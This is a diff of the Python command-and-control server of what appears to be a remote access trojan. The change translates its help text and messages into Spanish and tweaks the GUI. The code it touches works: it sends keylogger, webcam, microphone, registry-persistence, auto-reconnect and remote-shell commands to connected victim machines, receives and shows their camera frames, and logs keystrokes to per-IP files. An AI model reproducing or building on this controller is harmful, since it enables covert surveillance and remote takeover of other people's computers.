@@ -32,41 +32,47 @@ class Command_Center():
         self.buttons_clients = []
         self.status_keylogger = False
         self.HELP = '''
-        Help banner - Commands
+        Baner de Ayuda - Comandos listados abajo
 
-        help -> to show this banner
+        ayuda -> este comando muestra el baner de ayuda
 
-        info -> to view server information
+        info -> para ver informacion resumida del servidor
 
-        vars -> to view variables of the server
+        vars -> para ver las variables del servidor
 
-        list -> list connected clients and their indexes
+        listar -> lista a los clientes conectados con sus indices
 
-        del (INDEXCLIENT)-> remove a client
+        borrar (INDICE)-> borra a un cliente
         
-        set (IP | PORT) (VALUE)-> modify your IP and PORT
+        cambiar (IP | PORT) (VALOR)-> modifica tu IP y PUERTO
 
 
-        send  (INDEXCLIENT) (COMMAND) -> to send a remote command to a client :
-            Possible commands
-                info      -> show information of a Client
-                autocon   -> if the server is stopped the client will try to connect again and again
-                keylogger -> create a file with the ip address of the client and log the keys pressed by the client.
-                camera    -> activate a camera if available (q to exit not Q)
-                mic       -> activate a microphone if available (q to exit not Q)
-                persist   -> modify the registers in the startup for start the client
-                shell     -> get a shell in the system
+        enviar  (INDICE) (COMANDO) -> envia un comando remoto al cliente :
+            Los Posibles comandos son:
+                info      -> Muestra Informacion del Cliente
+                autocon   -> Si el Servidor es parado el cliente se intentara volver a conectar para siempre
+                keylogger -> Crea un archivo con la direccion IP del cliente donde se guardan las teclas presionadas
+                camera    -> Activa la camara si esta esta disponible (q para salir no Q)
+                mic       -> Activa el microfono si esta esta disponible (q para salir no Q)
+                persist   -> Modifica los registros de windows para tener persistencia en el equipo
+                shell     -> Obtiene una consola dentro del sistema
 
-        stop -> stop the server
+        parar -> para parar el servidor
         
-        start -> start the server
+        iniciar -> para iniciar el servidor 
 
-        cls | clear -> clear the display
+        cls | clear -> limpia la pantalla 
         '''
     def start_server(self):
         if not self.check_addr():
-            self.PrintSmart('\n[-] Check your Ip and Port')
+            self.PrintSmart('\n[-] Revisa Tu IP y PUERTO')
+            if self.MODE == 'grafico':
+                self.Button_start_stop.configure(text='INICIAR SERVIDOR')
             return
+        if self.MODE == 'grafico':
+            self.Button_start_stop.configure(text='PARAR SERVIDOR')
+            self.IPBOX.configure(text=f'IP:{self.IP}')
+            self.PORTBOX.configure(text=f'PORT:{self.PORT}')
         self.status = True
         self.server_thread = threading.Thread(target=self.server_main_function,daemon=True)
         self.server_thread.start()
@@ -90,28 +96,28 @@ class Command_Center():
         context.load_cert_chain(certfile="server.cer", keyfile="server.key")
         self.Server = await asyncio.start_server(self.handle_connection, self.IP, int(self.PORT),ssl=context)
         addr = self.Server.sockets[0].getsockname()
-        self.PrintSmart(f'\n[+] Serving on {addr}')
+        self.PrintSmart(f'\n[+] Servidor Creado -> {addr}')
 
         async with self.Server:
             try:
                 await self.Server.serve_forever()
             except asyncio.CancelledError :
-                self.PrintSmart('\n[-] Server Closed')
+                self.PrintSmart('\n[-] Servidor Cerrado')
     
     async def handle_connection(self,reader, writer):
         client_address = writer.get_extra_info('peername')
-        if self.MODE == 'graphic':
+        if self.MODE == 'grafico':
             button = tk.Button(self.button_frame, text=f'{client_address}', command=lambda: self.GetClientIndexGUI(client_address))
             self.buttons_clients.append(button)
             button.pack(fill=tk.X)
-        self.PrintSmart(f'\n[+] New connection from {client_address}')
+        self.PrintSmart(f'\n[+] Nueva Conexion desde {client_address}')
         self.Clients.append(writer)
 
         while True:
             try:
                 data = await reader.read(self.BuffSize)
                 if not data:
-                    self.PrintSmart(f'\n[-] Client disconnected: {client_address}')
+                    self.PrintSmart(f'\n[-] Cliente Desconectado: {client_address}')
                     break
                 elif data.decode(errors='ignore') == 'mic':
                     self.status_mic = False
@@ -133,12 +139,12 @@ class Command_Center():
                             size_data = await asyncio.wait_for(reader.readexactly(4),2)
                             if not size_data is None and size_data.decode(errors='ignore') == 'exit':
                                 self.status_camera = False
-                                self.PrintSmart('\n[-] no cameras available')
+                                self.PrintSmart('\n[-] No hay camaras disponibles')
                                 break
                             size = int.from_bytes(size_data, 'big')
                             data = await asyncio.wait_for(reader.readexactly(size),2)
                             if not data is None and data.decode(errors='ignore') == 'exit':
-                                self.PrintSmart('\n[-] no cameras available')
+                                self.PrintSmart('\n[-] No hay camaras disponibles')
                                 self.status_camera = False
                                 break
                             ndarray = cv2.imdecode(np.frombuffer(data, np.uint8), cv2.IMREAD_COLOR)
@@ -158,17 +164,17 @@ class Command_Center():
                         f.close()
                     continue                    
                 msg = data.decode(errors='ignore')
-                self.PrintSmart(f'\n[+] Received from {client_address} : {msg}')
+                self.PrintSmart(f'\n[+] Mensaje recivido desde: {client_address} : {msg}')
                 if self.status_keylogger == True:
                     self.status_keylogger = False
             except (ConnectionResetError, BrokenPipeError,OSError):
                 if self.status_keylogger == True:
                     self.status_keylogger = False
-                self.PrintSmart(f'\n[-] Client disconnected: {client_address}')
+                self.PrintSmart(f'\n[-] Cliente Desconectado: {client_address}')
                 break
         self.Clients.remove(writer)
         writer.close()
-        if self.MODE == 'graphic':
+        if self.MODE == 'grafico':
             button.destroy()
             
 
@@ -176,14 +182,14 @@ class Command_Center():
         while True:
             if self.MODE == 'terminal':
                 try:
-                    command = input('\ncommand << ')
+                    command = input('\ncomando << ')
                 except (EOFError,KeyboardInterrupt):
                     if self.status == True:
                         await self.CloseServer()
                     break
-            if command == 'help':
+            if command == 'ayuda':
                 self.PrintSmart(self.HELP)
-            elif command.startswith('send'):
+            elif command.startswith('enviar'):
                 if self.status == True:
                     if  len(command.split()) == 3:
                         _, index ,msg= command.split()
@@ -197,23 +203,23 @@ class Command_Center():
                                 address = self.Clients[index].get_extra_info('peername')
                                 with open(f'{address}_logger.txt','w') as f:
                                     f.close()
-                                if self.MODE == 'graphic':
+                                if self.MODE == 'grafico':
                                     self.entry_status = False
                                     return
                             elif msg == 'keylogger' and  self.status_keylogger == True:
-                                self.PrintSmart('[-] Keylogger is running in a Client')
-                                if self.MODE == 'graphic':
+                                self.PrintSmart('[-] El keylogger esta corriendo en un cliente')
+                                if self.MODE == 'grafico':
                                     self.entry_status = False
                                     return
                             elif self.status_keylogger == True and msg != 'exit':
-                                self.PrintSmart('[-] Keylogger is running in a Client')
-                                if self.MODE == 'graphic':
+                                self.PrintSmart('[-] El keylogger esta corriendo en un cliente')
+                                if self.MODE == 'grafico':
                                     self.entry_status = False
                                     return
                                 continue
                             if msg == 'shell':
                                 self.status_shell = True
-                                if self.MODE == 'graphic':
+                                if self.MODE == 'grafico':
                                     self.Clients[index].write(bytes('shell','utf-8'))
                                     await self.Clients[index].drain()
                                     self.command_gui = None
@@ -228,7 +234,7 @@ class Command_Center():
                                 self.Clients[index].write(bytes('camera','utf-8'))
                                 await self.Clients[index].drain()
                                 await self.GetCamera(index)
-                                if self.MODE == 'graphic':
+                                if self.MODE == 'grafico':
                                     self.entry_status = False
                                     return
                                 continue
@@ -237,7 +243,7 @@ class Command_Center():
                                 self.Clients[index].write(bytes('mic','utf-8'))
                                 await self.Clients[index].drain()
                                 await self.GetMic(index)
-                                if self.MODE == 'graphic':
+                                if self.MODE == 'grafico':
                                     self.entry_status = False
                                     return
                                 continue
@@ -245,17 +251,17 @@ class Command_Center():
                                 self.Clients[index].write(bytes(msg,'utf-8'))
                                 await  self.Clients[index].drain()
                         except IndexError:
-                            self.PrintSmart('[-] Unknown Client Index\n')
+                            self.PrintSmart('[-] Indice Desconocido\n')
                         except ValueError:
-                            self.PrintSmart('[-] Bad Index\n')
+                            self.PrintSmart('[-] Indice Invalido\n')
                         except:
                             await self.GetShell(index)
                             continue
                     else:
-                        self.PrintSmart('[-] Missing Arguments : set INDEXCLIENT MSG')
+                        self.PrintSmart('[-] Argumentos Faltantes: enviar INDICE MENSAJE')
                 else:
-                    self.PrintSmart('[-] The Server is Down')
-            elif command.startswith('set'):
+                    self.PrintSmart('[-] El servidor esta apagado')
+            elif command.startswith('cambiar'):
                 if self.status == False:
                     if  len(command.split()) == 3:
                         _, var , value = command.split(' ')
@@ -264,12 +270,12 @@ class Command_Center():
                         elif var == 'PORT':
                             self.PORT = value
                         else:
-                            self.PrintSmart(f'[-] This variable {var} does not exist or cannot be changed')
+                            self.PrintSmart(f'[-] Esta variable {var} no existe o no puede ser cambiada')
                     else:
-                        self.PrintSmart('[-] Missing Arguments : set VARNAME VALUE')
+                        self.PrintSmart('[-] Argumentos Faltantes : cambiar NOMBREVARIABLE VALOR')
                 else:
-                    self.PrintSmart('[-] The Server is Running')
-            elif command.startswith('del'):
+                    self.PrintSmart('[-] El servidor esta prendido')
+            elif command.startswith('borrar'):
                 if self.status == True:  
                     if  len(command.split()) == 2:
                         _, index = command.split(' ')
@@ -278,12 +284,12 @@ class Command_Center():
                             # self.PrintSmart('[+] Client removed ' + str(self.Clients[index].get_extra_info('peername')))
                             self.Clients[index].close()
                         except IndexError:
-                            self.PrintSmart('[-] Unknown Client Index')
+                            self.PrintSmart('[-] Indice Desconocido')
                         
                     else:
-                        self.PrintSmart('[-] Missing Arguments : set INDEXCLIENT')
+                        self.PrintSmart('[-] Argumentos Faltantes : cambiar INDICE')
                 else:
-                    self.PrintSmart('[-] The Server is Down')
+                    self.PrintSmart('[-] El Servidor esta apagado')
             elif command == 'vars':
                 self.PrintSmart(f'MODE={self.MODE}')
                 self.PrintSmart(f'IP={self.IP}')
@@ -300,46 +306,49 @@ class Command_Center():
                 self.PrintSmart(f'LINES_GUI={self.lines_gui}')
                 self.PrintSmart(f'ENTRY_STATUS={self.entry_status}')
             elif command == 'info':
-                self.PrintSmart(f'IP : {self.IP} , PORT : {self.PORT} , RUNNING : {self.status}')
-            elif command == 'list':
+                self.PrintSmart(f'IP : {self.IP} , PORT : {self.PORT} , ESTADO DEL SERVIDOR : {self.status}')
+            elif command == 'listar':
                 for i in range(len(self.Clients)):
                     self.PrintSmart(f'{i} :' + str(self.Clients[i].get_extra_info('peername')))
-            elif command == 'start':
+            elif command == 'iniciar':
                 if self.status == False:
                     self.start_server()
                 else:
-                    self.PrintSmart('[-] The Server is Running')
-            elif command == 'stop':
+                    self.PrintSmart('[-] El servidor esta prendido')
+            elif command == 'parar':
                 if self.status == True:
                     await self.CloseServer()
-                    self.PrintSmart('[+] Stopping the server')
+                    self.PrintSmart('[+] Parando el servidor')
                 else:
-                    self.PrintSmart('[-] The Server is Down')
+                    self.PrintSmart('[-] El servidor esta apagado')
             elif (command == 'clear' or command == 'cls') and self.MODE == 'terminal':
                 if os.name == 'posix':
                     os.system('clear')
                 else:
                     os.system('cls')
             elif (command == 'quit' or command =='exit') and self.MODE == 'terminal':
-                self.PrintSmart('\nPress Control +c  to exit')
-            elif (command == 'cls' or command == 'clear') and self.MODE == 'graphic':
+                self.PrintSmart('\nPresiona CTRL + c para salir')
+            elif (command == 'cls' or command == 'clear') and self.MODE == 'grafico':
                 self.console.configure(state="normal")
                 self.console.delete('1.0',tkinter.END)
                 self.console.configure(state="disable")
                 self.lines_gui = 0
                 self.entry_status = False
-            elif self.MODE == 'graphic':
-                self.PrintSmart('[-] Error Command')
+            elif self.MODE == 'grafico':
+                self.PrintSmart('[-] Comando desconocido')
                 
-            if self.MODE == 'graphic':
+            if self.MODE == 'grafico':
                 self.entry_status = False
                 break
     def ButtonStart(self):
         if self.status == False:
-            self.Button_start_stop.configure(text='STOP SERVER')
+            if self.MODE == 'grafico':
+                self.IPBOX.configure(text=f'IP:{self.IP}')
+                self.PORTBOX.configure(text=f'PORT:{self.PORT}')
+            self.Button_start_stop.configure(text='PARAR SERVIDOR')
             self.start_server()
         else:
-            self.Button_start_stop.configure(text='START SERVER')
+            self.Button_start_stop.configure(text='INICIAR SERVIDOR')
             self.CloseServer_notAsync()
             self.current_client_index = None
 
@@ -355,7 +364,7 @@ class Command_Center():
         self.command_gui = self.input_command.get()
 
         if self.status_shell == False:
-            self.PrintSmart('command << ' + self.command_gui)
+            self.PrintSmart('comando << ' + self.command_gui)
         
         if self.entry_status == False:
             self.entry_status = True
@@ -375,49 +384,49 @@ class Command_Center():
                 if self.Clients[i].get_extra_info('peername') == client_address:
                     self.current_client_index = i
                     break
-            self.console_frame.set('current client')
+            self.console_frame.set('Cliente Actual')
         except:
             self.Clients = []
     def ButtonsCurrentClient(self,opt):
         if len(self.Clients) == 0:
             self.current_client_index = None
         if self.current_client_index is None:
-            self.console_frame.set('console')
-            self.PrintSmart('[-] there are no Client Selected')
+            self.console_frame.set('Consola')
+            self.PrintSmart('[-] Primero Selecciona Un Cliente')
             return
         if opt == 'shell' and self.status_shell == False and self.status_keylogger == False:
-            self.PrintSmart('[+] Wait for the shell ...')
-            self.console_frame.set('console')
+            self.PrintSmart('[+] Esperando a recibir una consola')
+            self.console_frame.set('Consola')
             self.entry_status = True
         elif opt == 'keylogger' and self.status_keylogger == False and self.status_shell == False:
-            self.console_frame.set('console')
-            self.PrintSmart('[+] keylogger activated')
-            self.PrintSmart('send (INDEXCLIENT) exit - to stop keylogger')
+            self.console_frame.set('Consola')
+            self.PrintSmart('[+] El keylogger esta activado')
+            self.PrintSmart('enviar (INDICE) exit - envia eso para parar el keylogger')
         elif opt == 'keylogger' and self.status_keylogger == True and self.status_shell == False:
-            self.console_frame.set('console')
-            self.PrintSmart('[-] keylogger is running')
+            self.console_frame.set('Consola')
+            self.PrintSmart('[-] El keylogger esta activo en un cliente cierralo')
             return
         elif (opt == 'autocon' or opt == 'info' or opt == 'persist') and self.status_keylogger == False and self.status_shell == False:
-            self.console_frame.set('console')
-        elif opt == 'del' and self.status_keylogger == False and self.status_shell == False:
-            self.console_frame.set('console')
-            asyncio.run(self.terminal_interface(f'del {self.current_client_index}'))
+            self.console_frame.set('Consola')
+        elif opt == 'borrar' and self.status_keylogger == False and self.status_shell == False:
+            self.console_frame.set('Consola')
+            asyncio.run(self.terminal_interface(f'borrar {self.current_client_index}'))
             return
         elif self.status_shell == True:
-            self.console_frame.set('console')
-            self.PrintSmart('[-] Shell is activated')
+            self.console_frame.set('Consola')
+            self.PrintSmart('[-] La Consola remota esta activa apagala')
             return
         elif self.status_keylogger == True:
-            self.console_frame.set('console')
-            self.PrintSmart('[-] Keylogger is running in a client')
+            self.console_frame.set('Consola')
+            self.PrintSmart('[-] El keylogger esta activo en un cliente cierralo')
             return
-        asyncio.run(self.terminal_interface(f'send {self.current_client_index} ' + opt))
+        asyncio.run(self.terminal_interface(f'enviar {self.current_client_index} ' + opt))
     def Graphic_Interface(self):
         self.app = customtkinter.CTk()
         # configure window
         self.app.geometry(f"{1100}x{580}")
         customtkinter.set_appearance_mode('dark')
-        self.app.title('Command Center')
+        self.app.title('Centro De Comandos')
         self.app.geometry('1000x600')
         self.app.resizable(False,False)
         
@@ -444,22 +453,22 @@ class Command_Center():
             width=500,
             height=450,
         )
-        self.console_frame.add('console')
-        self.console_frame.add('current client')
+        self.console_frame.add('Consola')
+        self.console_frame.add('Cliente Actual')
 
         self.input_command = customtkinter.CTkEntry(
             self.app,
             width=500,
             height=5,
-            placeholder_text='Type a command'
+            placeholder_text='Escribe un comando'
             )
         self.Button_start_stop = customtkinter.CTkButton(
             self.app,
-            text='START SERVER',
+            text='INICIAR SERVIDOR',
             command=self.ButtonStart
             )
         self.console = customtkinter.CTkTextbox(
-            self.console_frame.tab('console'), 
+            self.console_frame.tab('Consola'), 
             corner_radius=5,
             width=490,
             height=400,
@@ -467,43 +476,43 @@ class Command_Center():
         )
 
         self.Button_Camera = customtkinter.CTkButton(
-            self.console_frame.tab('current client'),
-            text='Camera',
+            self.console_frame.tab('Cliente Actual'),
+            text='Camara',
             command=lambda:self.ButtonsCurrentClient('camera')
         )
         self.Button_Mic = customtkinter.CTkButton(
-            self.console_frame.tab('current client'),
-            text='Microphone',
+            self.console_frame.tab('Cliente Actual'),
+            text='Microfono',
             command=lambda:self.ButtonsCurrentClient('mic')
         )
         self.Button_Shell = customtkinter.CTkButton(
-            self.console_frame.tab('current client'),
-            text='Shell',
+            self.console_frame.tab('Cliente Actual'),
+            text='Consola',
             command=lambda:self.ButtonsCurrentClient('shell')
         )
         self.Button_AUTOCON = customtkinter.CTkButton(
-            self.console_frame.tab('current client'),
-            text='AUTOCON',
+            self.console_frame.tab('Cliente Actual'),
+            text='AUTOCONECTAR',
             command=lambda:self.ButtonsCurrentClient('autocon')
         )
         self.Button_KEYLOGGER = customtkinter.CTkButton(
-            self.console_frame.tab('current client'),
+            self.console_frame.tab('Cliente Actual'),
             text='KEYLOGGER',
             command=lambda:self.ButtonsCurrentClient('keylogger')
         )
         self.Button_INFO = customtkinter.CTkButton(
-            self.console_frame.tab('current client'),
-            text='INFO',
+            self.console_frame.tab('Cliente Actual'),
+            text='INFORMACION',
             command=lambda:self.ButtonsCurrentClient('info')
         )
         self.Button_DEL = customtkinter.CTkButton(
-            self.console_frame.tab('current client'),
-            text='DELETE',
-            command=lambda:self.ButtonsCurrentClient('del')
+            self.console_frame.tab('Cliente Actual'),
+            text='BORRAR',
+            command=lambda:self.ButtonsCurrentClient('borrar')
         )
         self.Button_PERSIST = customtkinter.CTkButton(
-            self.console_frame.tab('current client'),
-            text='PERSIST',
+            self.console_frame.tab('Cliente Actual'),
+            text='PERSISTENCIA',
             command=lambda:self.ButtonsCurrentClient('persist')
         )
         
@@ -538,23 +547,23 @@ class Command_Center():
             return False
         
         if not self.PORT.isdigit() or  not int(self.PORT) >= 1 or not int(self.PORT) <= 6535:
-            self.PrintSmart(f'\n[-]Invalid Port {self.PORT}')
+            self.PrintSmart(f'\n[-]Puerto Invalido {self.PORT}')
             return False
 
         try:
             ipaddress.ip_address(self.IP)
         except ValueError:
-            self.PrintSmart(f'\n[-]Invalid IP {self.IP}')
+            self.PrintSmart(f'\n[-]IP Invalida{self.IP}')
             return False
         return True
 
     async def GetCamera(self,index):
         try:
-            if self.MODE == 'graphic':
+            if self.MODE == 'grafico':
                self.app.attributes("-disabled", True)
-            if not self.MODE == 'graphic':
-                self.PrintSmart('\nWait a moment please.....')
-                self.PrintSmart('\nPress q to exit')
+            if not self.MODE == 'grafico':
+                self.PrintSmart('\nEspere un momento porfavor...')
+                self.PrintSmart('\nPresione q para salir')
             while self.status_camera:
                 if not self.frame is None:
                     cv2.imshow('Frame', self.frame)
@@ -564,13 +573,13 @@ class Command_Center():
                     self.Clients[index].write(b'exit')
                     await self.Clients[index].drain()
                     cv2.destroyAllWindows()
-                    if self.MODE == 'graphic':
+                    if self.MODE == 'grafico':
                         self.app.attributes("-disabled", False)
-                        self.console_frame.set('console')    
+                        self.console_frame.set('Consola')    
                     break
-            if self.MODE == 'graphic':
+            if self.MODE == 'grafico':
                 self.app.attributes("-disabled", False)
-                self.console_frame.set('console')    
+                self.console_frame.set('Consola')    
         except KeyboardInterrupt:
             self.status_shell = False
             self.Clients[index].write(b'exit')
@@ -580,9 +589,9 @@ class Command_Center():
         except:
             self.status_camera = False
             cv2.destroyAllWindows()
-            if self.MODE == 'graphic':
+            if self.MODE == 'grafico':
                 self.app.attributes("-disabled", False)
-                self.console_frame.set('console') 
+                self.console_frame.set('Consola') 
             return
 
     async def GetShell(self,index):
@@ -591,14 +600,14 @@ class Command_Center():
             try:
                 if self.MODE == 'terminal':
                     shellcommand = input()
-                elif self.MODE == 'graphic':
+                elif self.MODE == 'grafico':
                     return
             except (EOFError,KeyboardInterrupt):
                 break
             if shellcommand == 'exit':
                 self.Clients[index].write(bytes(shellcommand,'utf-8'))
                 await  self.Clients[index].drain()
-                self.PrintSmart('[-] Shell Closed\n')
+                self.PrintSmart('[-] Consola Cerrada\n')
                 break
             elif len(shellcommand) == 0:
                 self.Clients[index].write(bytes('ENTERCOMMAND','utf-8'))
@@ -627,14 +636,14 @@ class Command_Center():
 
         stream.start_stream()
 
-        if not self.MODE == 'graphic':
-            self.PrintSmart('\n[+] Recording')
+        if not self.MODE == 'grafico':
+            self.PrintSmart('\n[+] Grabando Audio')
 
-            self.PrintSmart('\nControl + c to stop IMPORTANT:(try one or two | no more)')
+            self.PrintSmart('\nPresione q para salir')
 
-            self.PrintSmart('\nwait a moment please')
+            self.PrintSmart('\nEspere un Momento porfavor...')
 
-        if self.MODE == 'graphic':
+        if self.MODE == 'grafico':
             self.app.attributes("-disabled", True)
         try:
             frame = np.zeros((512, 512, 1), dtype = "uint8")
@@ -649,13 +658,13 @@ class Command_Center():
                     self.Clients[index].write(b'exit')
                     await self.Clients[index].drain()
                     cv2.destroyAllWindows()
-                    if self.MODE == 'graphic':
+                    if self.MODE == 'grafico':
                         self.app.attributes("-disabled", False)    
                     break
             cv2.destroyAllWindows()
-            if self.MODE == 'graphic':
+            if self.MODE == 'grafico':
                 self.app.attributes("-disabled", False)
-                self.console_frame.set('console')
+                self.console_frame.set('Consola')
         except KeyboardInterrupt:
             stream.stop_stream()
             self.Clients[index].write(b'exit')
@@ -664,9 +673,9 @@ class Command_Center():
         except:
             self.status_camera = False
             cv2.destroyAllWindows()
-            if self.MODE == 'graphic':
+            if self.MODE == 'grafico':
                 self.app.attributes("-disabled", False)
-                self.console_frame.set('console') 
+                self.console_frame.set('Consola') 
             return
 
     def PrintSmart(self,txt):
@@ -675,7 +684,7 @@ class Command_Center():
                 print(txt,end='')
             else:
                 print(txt)
-        elif self.MODE == 'graphic':
+        elif self.MODE == 'grafico':
             try:
                 lines = txt.count('\n')
                 self.console.configure(state='normal')
@@ -688,6 +697,8 @@ class Command_Center():
                 print(txt)
 
     async def CloseServer(self):
+        if self.MODE == 'grafico':
+            self.Button_start_stop.configure(text='INICIAR SERVIDOR')
         self.status = False
         self.status_shell = False
         self.status_camera = False
